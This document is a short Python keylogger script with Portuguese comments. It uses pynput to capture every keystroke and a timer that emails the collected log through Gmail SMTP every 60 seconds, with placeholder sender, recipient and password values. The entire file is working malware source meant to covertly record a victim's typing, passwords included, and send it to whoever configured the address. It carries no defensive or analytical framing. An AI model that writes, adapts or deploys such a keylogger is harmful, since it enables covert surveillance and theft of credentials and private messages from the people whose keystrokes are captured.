from pynput import keyboard
import smtplib
from email.mime.text import MIMEText
from threading import Timer

log = ""

#CONFIGURACAO DE EMAIL
EMAIL_ORIGEM = "teste@gmail.com"
EMAIL_DESTINO = "teste@gmail.com"
SENHA_EMAIL = "suasenha"

def enviar_email():
    global log
    if log:
        msg = MIMEText(log)
        msg['SUBJECT'] = EMAIL_ORIGEM
        msg['To'] = EMAIL_DESTINO

        try:
            server = smtplib.SMTP("smtp.gmail.com", 587)
            server.starttls()
            server.login(EMAIL_ORIGEM, SENHA_EMAIL)
            server.send_message(msg)
            server.quit()
        except Exception as e:
            print("ERRO AO ENVIAR!", e)
        
        log = ""

    # Agendar o envio a cada 60s
    Timer(60, enviar_email).start()

def on_press(key):
    global log
    try:
        log+= key.char
    except AttributeError:
        if key == keyboard.Key.space:
                log += " "
        elif key == keyboard.Key.enter:
                log += "\n"
        elif key == keyboard.Key.tab:
                log += "\t"
        elif key == keyboard.Key.backspace:
                log += " "
        elif key == keyboard.Key.esc:
                log += " [ESC] "
        else:
             pass #Ignorar control,shift, etc
        
# Inciar o keylogger e o envio automático

with keyboard.Listener(on_press=on_press) as listener:
    enviar_email()
    listener.join()        
